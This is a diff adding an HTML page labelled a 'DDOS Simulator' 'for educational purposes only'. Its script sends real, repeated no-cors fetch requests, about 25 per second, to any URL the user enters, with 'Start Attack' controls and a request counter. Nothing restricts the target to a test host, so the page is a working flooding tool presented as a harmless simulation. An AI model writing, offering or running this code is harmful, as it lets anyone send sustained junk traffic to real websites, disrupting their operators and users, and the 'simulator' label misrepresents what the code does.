@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DDOS Simulator</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #121212;
+    color: #f0f0f0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+  h1 {
+    color: #e63946;
+    margin-bottom: 0.3em;
+    text-shadow: 0 0 10px #e63946;
+  }
+  p {
+    margin-top: 0;
+    font-size: 1.1em;
+    color: #a8dadc;
+  }
+  button {
+    background-color: #e63946;
+    border: none;
+    padding: 15px 35px;
+    margin-top: 1.5em;
+    color: white;
+    font-size: 1.2em;
+    border-radius: 10px;
+    cursor: pointer;
+    box-shadow: 0 0 15px #e63946;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #d62828;
+  }
+  #log {
+    margin-top: 2em;
+    background: #1f1f1f;
+    border-radius: 12px;
+    padding: 1em;
+    width: 90vw;
+    max-width: 600px;
+    height: 180px;
+    overflow-y: auto;
+    box-shadow: inset 0 0 20px #e63946;
+    font-family: monospace;
+    font-size: 0.9em;
+    color: #f0f0f0;
+  }
+</style>
+</head>
+<body>
+  <h1>DDOS Simulator</h1>
+  <p>Simulates multiple requests to a URL (for educational purposes only)</p>
+  <input type="text" id="targetUrl" placeholder="Enter target URL" style="width: 90vw; max-width: 600px; padding: 12px; border-radius: 8px; border: none; font-size: 1em;" />
+  <button id="startBtn">Start Attack</button>
+  <div id="log" aria-live="polite" aria-atomic="true"></div>
+
+  <script>
+    const startBtn = document.getElementById('startBtn');
+    const targetUrlInput = document.getElementById('targetUrl');
+    const logDiv = document.getElementById('log');
+    let attackInterval;
+    let count = 0;
+    let running = false;
+
+    function log(message) {
+      const now = new Date();
+      const timestamp = now.toLocaleTimeString();
+      logDiv.textContent = `[${timestamp}] ${message}\n` + logDiv.textContent;
+    }
+
+    function sendRequest(url) {
+      fetch(url, {mode: 'no-cors'}).then(() => {
+        count++;
+        if (count % 10 === 0) {
+          log(`Sent ${count} requests...`);
+        }
+      }).catch(() => {
+        log('Request failed or blocked.');
+      });
+    }
+
+    startBtn.addEventListener('click', () => {
+      if (running) {
+        clearInterval(attackInterval);
+        running = false;
+        startBtn.textContent = "Start Attack";
+        log('Attack stopped.');
+        return;
+      }
+
+      const url = targetUrlInput.value.trim();
+      if (!url) {
+        alert('Please enter a valid URL.');
+        return;
+      }
+
+      count = 0;
+      logDiv.textContent = '';
+      log(`Starting attack on: ${url}`);
+      running = true;
+      startBtn.textContent = "Stop Attack";
+
+      attackInterval = setInterval(() => {
+        // Send 5 requests rapidly
+        for (let i = 0; i < 5; i++) {
+          sendRequest(url);
+        }
+      }, 200);
+    });
+  </script>
+</body>
+</html>
+
+```
